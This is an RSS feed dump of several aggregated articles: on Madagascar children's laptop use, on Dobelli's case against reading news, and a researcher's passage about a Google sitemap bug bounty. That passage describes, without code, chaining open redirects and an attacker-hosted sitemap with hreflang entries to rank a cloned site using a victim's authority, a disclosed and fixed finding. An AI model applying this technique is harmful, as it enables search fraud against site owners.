<og:description>The Department of Justice’s Office of the Inspector General (OIG) last week released a new report that supports what EFF has long suspected: that the FBI’s legal fight with Apple in 2016 to create backdoor access to a San Bernardino shooter’s iPhone was more focused on creating legal precedent than...</og:description>
<og:image>https://www.eff.org/files/apple-v-fbi.png</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.eff.org/deeplinks/2018/04/fbi-could-have-gotten-san-bernardino-shooters-iphone-leadership-didnt-say</dc:identifier>
</item>
<item>
<title>How kids in a low-income country use laptops: lessons from Madagascar</title>
<link>https://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</link>
<guid isPermaLink="true" >https://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</guid>
<description>&lt;p&gt;Every child, no matter what country they’re from or their social background, should have the chance to use and learn about technology. That’s the thinking behind a number of projects led by international organisations like &lt;a href=&quot;https://en.unesco.org/themes/ict-education&quot;&gt;UNESCO&lt;/a&gt; and UNICEF. They hope to bolster education and economic growth by making digital technologies available in the developing world.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&quot;http://one.laptop.org/&quot;&gt;One Laptop Per Child project&lt;/a&gt; was a pioneer in this field. This educational project, launched by the MIT in 2005, produces &lt;a href=&quot;http://laptop.org/en/laptop/&quot;&gt;laptop computers&lt;/a&gt; suitable for children aged between 6 and 12. These are loaded with an operating system that features free educational software called &lt;a href=&quot;https://sugarlabs.org/&quot;&gt;Sugar&lt;/a&gt;. The programme has been rolled out at schools in more than 30 countries.&lt;/p&gt;
&lt;p&gt;The project aims to equip all primary school children and all teachers with computers in a way that involves communities and that ensures everyone feels a sense of responsibility for the equipment. For example, kids aged six to 12 own their computers and can take them home to use.&lt;/p&gt;
&lt;p&gt;Research &lt;a href=&quot;http://journals.sagepub.com/doi/abs/10.3102/0034654316628645&quot;&gt;shows&lt;/a&gt; that using technology in school makes children more engaged with learning. We wanted to know how children in low-income countries use laptops in their everyday lives; in school and after class. To find out, we embarked &lt;a href=&quot;https://www.tandfonline.com/eprint/cv4y7UqYqzxcWtcNAuEe/full&quot;&gt;on a study&lt;/a&gt; in a village in Madagascar four years after the project was launched there.&lt;/p&gt;
&lt;p&gt;Our results show that the use of computers in low-income countries supports formal and informal learning activities at home. It provides easy access to information, educational games and tools for self-expression.&lt;/p&gt;
&lt;h2&gt;Use at school&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://datatopics.worldbank.org/education/country/madagascar&quot;&gt;Madagascar&lt;/a&gt;, an island nation off Africa’s southeast coast, is extremely poor: 75% of the population (25 million) live below the poverty line, and the country scores low on the &lt;a href=&quot;http://hdr.undp.org/en/content/human-development-index-hdi&quot;&gt;human development index&lt;/a&gt;, performing poorly in areas like education and living standards.&lt;/p&gt;
&lt;p&gt;The study was conducted in a village located on the island of Nosy Komba, in the northeast of the country. Laptops are seen among residents there as high status objects because they cost a lot of money. None of the parents we interviewed could afford to buy one. They also have a high symbolic value: parents believe that if their children can master laptop use they will become more intelligent and develop professional skills.&lt;/p&gt;
&lt;p&gt;A programme was rolled out in the village by &lt;a href=&quot;https://olpc-france.org/&quot;&gt;One Laptop Per Child France&lt;/a&gt; and another French organisation, &lt;a href=&quot;https://www.facebook.com/GducoeurESGMS&quot;&gt;Gducœur&lt;/a&gt;. They supplied laptops and provided technical, logistical, administrative, financial and educational support. The laptops were given to 160 children aged between 5 and 15 enrolled in the village’s primary school.&lt;/p&gt;
&lt;p&gt;Our analysis was both quantitative and a qualitative. We examined logs that showed which applications the children had used on their laptops during the previous 12 months; we analysed what they’d produced – for instance, recorded files. And we interviewed the children and their parents.&lt;/p&gt;
&lt;p&gt;The results showed that the laptops were used very differently at school and in the children’s homes. At school, computers were generally used to learn about word processing, to play educational games and to support creative activities (drawing, digital story telling). Computers were also used as a virtual learning environment that offered a range of resources unavailable in the classroom like calculators, ebooks, maps, a watch, measuring tools and so on.&lt;/p&gt;
&lt;a href=&quot;https://images.theconversation.com/files/210319/original/file-20180314-113482-or0fvs.jpg?ixlib=rb-1.1.0&amp;amp;q=45&amp;amp;auto=format&amp;amp;w=1000&amp;amp;fit=clip&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://images.theconversation.com/files/210319/original/file-20180314-113482-or0fvs.jpg?ixlib=rb-1.1.0&amp;amp;q=45&amp;amp;auto=format&amp;amp;w=237&amp;amp;fit=clip&quot;/&gt;&lt;/a&gt; &lt;span class=&quot;caption&quot;&gt;A teacher at work with his class in the Nosy Komba primary school.&lt;/span&gt; &lt;span class=&quot;attribution&quot;&gt;&lt;span class=&quot;source&quot;&gt;http://www.nosykombaproject.org/gallerie-photos/&lt;/span&gt;&lt;/span&gt;
&lt;p&gt;At home the children, like their peers in developed countries, largely used computers to take photos or make videos, listen to music, play games, share content and do homework. The younger children tended to use fewer reading and writing applications. Those in the equivalent of fourth and fifth grade used more digital books; they also shared images and videos more frequently with their friends.&lt;/p&gt;
&lt;h2&gt;Similarities and differences&lt;/h2&gt;
&lt;p&gt;Our findings suggest that developing countries like Madagascar have something in common with western nations when it comes to laptop use, such as how the children used the computers at home.&lt;/p&gt;
&lt;p&gt;But there was one marked difference: computer use in Madagascar tended to be a collective rather than an individual practice. Children and their families would gather around one laptop to play educational games, take photos or make videos. Computers were being used to strengthen existing social relations among siblings, parents and peers.&lt;/p&gt;
&lt;p&gt;All of this is important and valuable. Laptops have introduced the children of Nosy Komba to previously inaccessible tools. But we found that original projects were limited. While applications used were designed to foster creativity, children need support to develop creativity skills.&lt;/p&gt;
&lt;p&gt;Educators have a crucial role to play here. They can help to nurture children’s creativity: the can help them to connect their lived experience and to express their imagination to produce original content. This will unlock new forms of expression and different kinds of literacy, including visual.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This article was co-authored with Pierre Varly, an international consultant in quantitative methods in education. He runs &lt;a href=&quot;https://varlyproject.wordpress.com/&quot;&gt;a blog&lt;/a&gt; on education in developing countries.&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 12:12:32 +0000</pubDate>
<dc:creator>rbanffy</dc:creator>
<og:title>How kids in a low-income country use laptops: lessons from Madagascar</og:title>
<og:description>Laptops have introduced the children of Nosy Komba in Madagascar to previously inaccessible tools.</og:description>
<og:type>article</og:type>
<og:image>https://images.theconversation.com/files/210317/original/file-20180314-113462-1kgcrn1.jpg?ixlib=rb-1.1.0&amp;q=45&amp;auto=format&amp;w=1356&amp;h=668&amp;fit=crop</og:image>
<og:url>http://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</og:url>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://theconversation.com/how-kids-in-a-low-income-country-use-laptops-lessons-from-madagascar-93305</dc:identifier>
</item>
<item>
<title>Giving up reading news will make us happier</title>
<link>https://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</link>
<guid isPermaLink="true" >https://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</guid>
<description>&lt;p&gt;&lt;span class=&quot;drop-cap&quot;&gt;&lt;span class=&quot;drop-cap__inner&quot;&gt;I&lt;/span&gt;&lt;/span&gt;n the past few decades, the fortunate among us have recognised the hazards of living with an overabundance of food (obesity, diabetes) and have started to change our diets. But most of us do not yet understand that news is to the mind what sugar is to the body. News is easy to digest. The media feeds us small bites of trivial matter, tidbits that don't really concern our lives and don't require thinking. That's why we experience almost no saturation. Unlike reading books and long magazine articles (which require thinking), we can swallow limitless quantities of news flashes, which are bright-coloured candies for the mind. Today, we have reached the same point in relation to information that we faced 20 years ago in regard to food. We are beginning to recognise how toxic news can be.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News misleads.&lt;/strong&gt; Take the following event (borrowed from Nassim Taleb). A car drives over a bridge, and the bridge collapses. What does the news media focus on? The car. The person in the car. Where he came from. Where he planned to go. How he experienced the crash (if he survived). But that is all irrelevant. What's relevant? The structural stability of the bridge. That's the underlying risk that has been lurking, and could lurk in other bridges. But the car is flashy, it's dramatic, it's a person (non-abstract), and it's news that's cheap to produce. News leads us to walk around with the completely wrong risk map in our heads. So terrorism is over-rated. Chronic stress is under-rated. The collapse of Lehman Brothers is overrated. Fiscal irresponsibility is under-rated. Astronauts are over-rated. Nurses are under-rated.&lt;/p&gt;
&lt;p&gt;We are not rational enough to be exposed to the press. Watching an airplane crash on television is going to change your attitude toward that risk, regardless of its real probability. If you think you can compensate with the strength of your own inner contemplation, you are wrong. Bankers and economists – who have powerful incentives to compensate for news-borne hazards – have shown that they cannot. The only solution: cut yourself off from news consumption entirely.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News is irrelevant.&lt;/strong&gt; Out of the approximately 10,000 news stories you have read in the last 12 months, name one that – because you consumed it – allowed you to make a better decision about a serious matter affecting your life, your career or your business. The point is: the consumption of news is irrelevant to you. But people find it very difficult to recognise what's relevant. It's much easier to recognise what's new. The relevant versus the new is the fundamental battle of the current age. Media organisations want you to believe that news offers you some sort of a competitive advantage. Many fall for that. We get anxious when we're cut off from the flow of news. In reality, news consumption is a competitive disadvantage. The less news you consume, the bigger the advantage you have.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News has no explanatory power.&lt;/strong&gt; News items are bubbles popping on the surface of a deeper world. Will accumulating facts help you understand the world? Sadly, no. The relationship is inverted. The important stories are non-stories: slow, powerful movements that develop below journalists' radar but have a transforming effect. The more &quot;news factoids&quot; you digest, the less of the big picture you will understand. If more information leads to higher economic success, we'd expect journalists to be at the top of the pyramid. That's not the case.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News is toxic to your body.&lt;/strong&gt; It constantly triggers the &lt;a href=&quot;https://www.theguardian.com/science/neurophilosophy/2012/may/16/neuroscience-psychology&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;limbic system&lt;/a&gt;. Panicky stories spur the release of cascades of glucocorticoid (cortisol). This deregulates your immune system and inhibits the release of growth hormones. In other words, your body finds itself in a state of chronic stress. High glucocorticoid levels cause impaired digestion, lack of growth (cell, hair, bone), nervousness and susceptibility to infections. The other potential side-effects include fear, aggression, tunnel-vision and desensitisation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News increases cognitive errors.&lt;/strong&gt; News feeds the mother of all cognitive errors: confirmation bias. In the words of Warren Buffett: &quot;What the human being is best at doing is interpreting all new information so that their prior conclusions remain intact.&quot; News exacerbates this flaw. We become prone to overconfidence, take stupid risks and misjudge opportunities. It also exacerbates another cognitive error: the story bias. Our brains crave stories that &quot;make sense&quot; – even if they don't correspond to reality. Any journalist who writes, &quot;The market moved because of X&quot; or &quot;the company went bankrupt because of Y&quot; is an idiot. I am fed up with this cheap way of &quot;explaining&quot; the world.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News inhibits thinking.&lt;/strong&gt; Thinking requires concentration. Concentration requires uninterrupted time. News pieces are specifically engineered to interrupt you. They are like viruses that steal attention for their own purposes. News makes us shallow thinkers. But it's worse than that. News severely affects memory. There are two types of memory. Long-range memory's capacity is nearly infinite, but working memory is limited to a certain amount of slippery data. The path from short-term to long-term memory is a choke-point in the brain, but anything you want to understand must pass through it. If this passageway is disrupted, nothing gets through. Because news disrupts concentration, it weakens comprehension. Online news has an even worse impact. &lt;a href=&quot;http://www.wired.com/magazine/2010/05/ff_nicholas_carr/&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;In a 2001 study two scholars in Canada&lt;/a&gt; showed that comprehension declines as the number of hyperlinks in a document increases. Why? Because whenever a link appears, your brain has to at least make the choice not to click, which in itself is distracting. News is an intentional interruption system.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News works like a drug.&lt;/strong&gt; As stories develop, we want to know how they continue. With hundreds of arbitrary storylines in our heads, this craving is increasingly compelling and hard to ignore. Scientists used to think that the dense connections formed among the 100 billion neurons inside our skulls were largely fixed by the time we reached adulthood. Today we know that this is not the case. Nerve cells routinely break old connections and form new ones. The more news we consume, the more we exercise the neural circuits devoted to skimming and multitasking while ignoring those used for reading deeply and thinking with profound focus. Most news consumers – even if they used to be avid book readers – have lost the ability to absorb lengthy articles or books. After four, five pages they get tired, their concentration vanishes, they become restless. It's not because they got older or their schedules became more onerous. It's because the physical structure of their brains has changed.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News wastes time.&lt;/strong&gt; If you read the newspaper for 15 minutes each morning, then check the news for 15 minutes during lunch and 15 minutes before you go to bed, then add five minutes here and there when you're at work, then count distraction and refocusing time, you will lose at least half a day every week. Information is no longer a scarce commodity. But attention is. You are not that irresponsible with your money, reputation or health. Why give away your mind?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News makes us passive.&lt;/strong&gt; News stories are overwhelmingly about things you cannot influence. The daily repetition of news about things we can't act upon makes us passive. It grinds us down until we adopt a worldview that is pessimistic, desensitised, sarcastic and fatalistic. The scientific term is &quot;learned helplessness&quot;. It's a bit of a stretch, but I would not be surprised if news consumption, at least partially contributes to the widespread disease of depression.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;News kills creativity.&lt;/strong&gt; Finally, things we already know limit our creativity. This is one reason that mathematicians, novelists, composers and entrepreneurs often produce their most creative works at a young age. Their brains enjoy a wide, uninhabited space that emboldens them to come up with and pursue novel ideas. I don't know a single truly creative mind who is a news junkie – not a writer, not a composer, mathematician, physician, scientist, musician, designer, architect or painter. On the other hand, I know a bunch of viciously uncreative minds who consume news like drugs. If you want to come up with old solutions, read news. If you are looking for new solutions, don't.&lt;/p&gt;
&lt;p&gt;Society needs journalism – but in a different way. Investigative journalism is always relevant. We need reporting that polices our institutions and uncovers truth. But important findings don't have to arrive in the form of news. Long journal articles and in-depth books are good, too.&lt;/p&gt;
&lt;p&gt;I have now gone without news for four years, so I can see, feel and report the effects of this freedom first-hand: less disruption, less anxiety, deeper thinking, more time, more insights. It's not easy, but it's worth it.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This is an edited extract from an essay first published at&lt;/em&gt; &lt;a href=&quot;http://dobelli.com/&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;&lt;em&gt;dobelli.com&lt;/em&gt;&lt;/a&gt;&lt;em&gt;. The Art of Thinking Clearly: Better Thinking, Better Decisions by Rolf Dobelli is published by Sceptre, £9.99. Buy it for £7.99 at&lt;/em&gt; &lt;a href=&quot;http://www.guardianbookshop.co.uk/BerteShopWeb/viewProduct.do?ISBN=9781444759549&quot; title=&quot;&quot; data-link-name=&quot;in body link&quot; class=&quot;u-underline&quot;&gt;&lt;em&gt;guardianbookshop.co.uk&lt;/em&gt;&lt;/a&gt;&lt;/p&gt;


</description>
<pubDate>Thu, 05 Apr 2018 10:52:23 +0000</pubDate>
<dc:creator>Ours90</dc:creator>
<og:url>http://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</og:url>
<og:description>News is bad for you. It leads to fear and aggression. It hinders your creativity and makes you sick. We should stop consuming it, says Rolf Dobelli, who's abstained for years</og:description>
<og:image>https://i.guim.co.uk/img/static/sys-images/Guardian/Pix/pictures/2013/4/12/1365789342841/news-montage-010.jpg?w=1200&amp;h=630&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=crop&amp;crop=faces%2Centropy&amp;bm=normal&amp;ba=bottom%2Cleft&amp;blend64=aHR0cHM6Ly91cGxvYWRzLmd1aW0uY28udWsvMjAxOC8wMS8zMS9mYWNlYm9va19kZWZhdWx0LnBuZw&amp;s=e6534bc091b105efe310da9067351c09</og:image>
<og:type>article</og:type>
<og:title>News is bad for you – and giving up reading it will make you happier</og:title>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.theguardian.com/media/2013/apr/12/news-is-bad-rolf-dobelli</dc:identifier>
</item>
<item>
<title>Google bug bounty for security exploit that influences search results</title>
<link>http://www.tomanthony.co.uk/blog/google-xml-sitemap-auth-bypass-black-hat-seo-bug-bounty/</link>
<guid isPermaLink="true" >http://www.tomanthony.co.uk/blog/google-xml-sitemap-auth-bypass-black-hat-seo-bug-bounty/</guid>
<description>&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Short version:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For the $12 cost of a domain, I was able to rank in Google search results with Amazon, Walmart etc. for high value money terms in the US. The Adwords bid price for some these terms is currently around $1 per click, and companies are spendings 10s of thousands of dollars a month to appear as ads on these search results, and I was appearing for free.&lt;/p&gt;
&lt;p&gt;Google have now fixed the issue and awarded a bug bounty of $1337.&lt;/p&gt;
&lt;p&gt;Google provides an open URL where you can ‘ping’ an XML sitemap which they will fetch and parse – this file can contain indexation directives. I discovered that for many sites it is possible to ping a sitemap that you (the attacker) are hosting in such a way that Google will trust the evil sitemap as belonging to the victim site.&lt;/p&gt;
&lt;p&gt;I believe this is the first time they have awarded a bounty for a security issue in the actual search engine, which directly affects the ranking of sites.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=16762922&quot;&gt;Hacker News Discussion&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.reddit.com/r/netsec/comments/89z47n/google_bug_bounty_for_security_exploit_that/&quot;&gt;/r/netsec Discussion&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;As part of my regular research efforts, I recently discovered an issue to Google that allows an attacker to submit an XML sitemap to Google for a site for which they are not authenticated. As these files can contain indexation directives, such as hreflang, it allows an attacker to utilise these directives to help their own sites rank in the Google search results.&lt;/p&gt;
&lt;p&gt;I spent $12 setting up my experiment and was ranking on the first page for high monetizable search terms, with a newly registered domain that had no inbound links.&lt;/p&gt;
&lt;h2&gt;XML Sitemap &amp;amp; Ping Mechanism&lt;/h2&gt;
&lt;p&gt;Google allows for the &lt;a href=&quot;https://support.google.com/webmasters/answer/183668?hl=en&quot;&gt;submission of an XML sitemap&lt;/a&gt;; these can help them discover URLs to crawl, but can also be used hreflang directives which they use to understand what other international versions of the same page may exist (i.e. “hey Google, this is the US page, but I have a German page on this URL…”). It is not known exactly how Google uses these directives (as with anything related to Google’s search algorithms), but it appears that hreflang allows for one URL to ‘borrow’ the link equity and trust from one URL and use it to rank another URL (i.e. most people link to the US .com version, and so the German version can ‘borrow’ the equity to rank better in Google.de).&lt;/p&gt;
&lt;p&gt;You can submit XML sitemaps for your domain either via Google Search Console, inside your robots.txt or via a special ‘ping’ URL. Google’s &lt;a href=&quot;https://support.google.com/webmasters/answer/183669?hl=en&quot;&gt;own docs&lt;/a&gt; seem a bit conflicting; at the top of the page they refer to submitting sitemaps via the ping mechanism, but at the bottom of the page they have this warning:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/google_docs-1024x144.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;98&quot; class=&quot;aligncenter size-large wp-image-651 ta-bordered&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/google_docs-1024x144.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/google_docs-300x42.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/google_docs-768x108.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/google_docs-700x99.png 700w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/google_docs.png 1419w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;However, in my experience you could absolutely submit new XML sitemaps via the ping mechanism, with Googlebot typically fetching the file within 10-15 seconds of the ping. Importantly, Google also mention a couple of times on the page that if you submit a sitemap via the ping mechanism &lt;em&gt;it will not show up inside your Search Console&lt;/em&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/not_listed-1024x156.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;107&quot; class=&quot;aligncenter size-large wp-image-653 ta-bordered&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/not_listed-1024x156.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/not_listed-300x46.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/not_listed-768x117.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/not_listed-700x107.png 700w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/not_listed.png 1520w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;As a related test, I tested whether I could add other known search directives (noindex, rel-canonical) via XML sitemaps (as well as trying a bunch of XML exploits), but Google didn’t seem to use them.&lt;/p&gt;
&lt;h4&gt;Google Search Console Submission&lt;/h4&gt;
&lt;p&gt;If you try to submit an XML sitemap in GSC, that includes URLs for another domain you are not authorised for, then GSC rejects them:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/search_console_ta-1024x176.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;120&quot; class=&quot;aligncenter size-large wp-image-677 ta-bordered&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/search_console_ta-1024x176.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/search_console_ta-300x51.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/search_console_ta-768x132.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/search_console_ta-700x120.png 700w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;We’ll come back to this in a moment.&lt;/p&gt;
&lt;p&gt;&lt;small&gt;(Sorry, Jono!)&lt;/small&gt;&lt;/p&gt;
&lt;h2&gt;Open Redirects&lt;/h2&gt;
&lt;p&gt;Many sites use a URL parameter to control a redirect:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/redirect-1024x99.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;68&quot; class=&quot;aligncenter size-large wp-image-664&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/redirect-1024x99.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/redirect-300x29.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/redirect-768x75.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/redirect-700x68.png 700w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/redirect.png 1505w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;In this example I would be redirected (after login) to &lt;code&gt;page.html&lt;/code&gt;. Some sites with poor hygiene allow for what are known as ‘open redirects’, where these parameters allow redirecting to a different domain:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect-1024x65.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;44&quot; class=&quot;aligncenter size-large wp-image-667&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect-1024x65.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect-300x19.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect-768x49.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect-700x44.png 700w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Often these don’t need any interaction (like a login), so they just redirect the user right away:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_logout-1024x71.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;49&quot; class=&quot;aligncenter size-large wp-image-669&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_logout-1024x71.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_logout-300x21.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_logout-768x53.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_logout-700x48.png 700w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Open redirects are very common, and often considered not too dangerous; Google does not include them in their bug bounty program for these reasons. However, where possible companies do try to protect against these, but often you can circumvent their protection:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/tesco_redirect-1024x310.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;212&quot; class=&quot;aligncenter size-large wp-image-671&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/tesco_redirect-1024x310.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/tesco_redirect-300x91.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/tesco_redirect-768x233.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/tesco_redirect-700x212.png 700w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Tesco are a UK retailer doing more than £50 billion in revenue, over a £1 billion of which via their website. I reported this example to Tesco (along with a number of others to other companies that I discovered during this research) and they have since fixed it.&lt;/p&gt;
&lt;h2&gt;Ping Sitemaps via Open Redirects 😱&lt;/h2&gt;
&lt;p&gt;At this point, you may have guessed where I’m going with this. In turns out that when you ping an XML sitemap, if the URL you submit is a redirect Google will follow that redirect, &lt;em&gt;even if it is cross domain&lt;/em&gt;. Importantly, it seems to still associate that XML sitemap with the domain that did the redirect, and treat the sitemap it finds after the redirect as authorised for that domain. For example:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_ping-1-1024x80.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;55&quot; class=&quot;aligncenter size-large wp-image-680&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_ping-1-1024x80.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_ping-1-300x24.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_ping-1-768x60.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/open_redirect_ping-1-700x55.png 700w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;In this case, the &lt;code&gt;evil.xml&lt;/code&gt; sitemap is hosted on &lt;code&gt;blue.com&lt;/code&gt;, but Google associates it as belonging to, and being authoritative for, &lt;code&gt;green.com&lt;/code&gt;. Using this you can submit XML sitemaps for sites you shouldn’t have control of, and send Google search directives.&lt;/p&gt;
&lt;h2&gt;Experiment: Using hreflang directive to ‘steal’ equity and rank for free&lt;/h2&gt;
&lt;p&gt;At this point I had the various moving parts, but I hadn’t confirmed that Google would really trust a cross-domain redirected XML sitemap, so I spun up an experiment to test it. I had done lots of smaller tests to understand various parts of this (as well as various dead ends), but didn’t expect this experiment to work as well as it did.&lt;/p&gt;
&lt;p&gt;I created a fake domain for a UK based retail company that doesn’t operate in the USA, and spun up an AWS server that mimicked the site (primarily through harvesting the legit content and retooling it – i.e. changing currency / address etc.). I have anonymised the company (and industry) here to protect them, so lets just call them &lt;code&gt;victim.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;I now created a fake sitemap that was hosted on &lt;code&gt;evil.com&lt;/code&gt;, but contained only URLs for &lt;code&gt;victim.com&lt;/code&gt;. These URLs contained hreflang entries for each URL pointing to an equivalent URL on &lt;code&gt;evil.com&lt;/code&gt;, indicating it was the US version of &lt;code&gt;victim.com&lt;/code&gt;. I now submitted this sitemap via an open redirect URL on &lt;code&gt;victim.com&lt;/code&gt; via Google’s ping mechanism.&lt;/p&gt;
&lt;p&gt;Within a 48 hours the site started getting small amounts of traffic for long tail terms (SEMRush screenshot):&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/semrush-1.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;289&quot; class=&quot;aligncenter size-full wp-image-671 ta-bordered&quot;/&gt;&lt;/p&gt;
&lt;p&gt;A couple more days passed and I started appearing for competitive terms on the 1st page, against the likes of Amazon &amp;amp; Walmart:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/rankings-1024x739.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;505&quot; class=&quot;aligncenter size-large wp-image-690 ta-bordered&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Furthermore, Google Search Console for &lt;code&gt;evil.com&lt;/code&gt; indicated that &lt;code&gt;victim.com&lt;/code&gt; was linking to &lt;code&gt;evil.com&lt;/code&gt;, although this obviously was not the case:&lt;/p&gt;
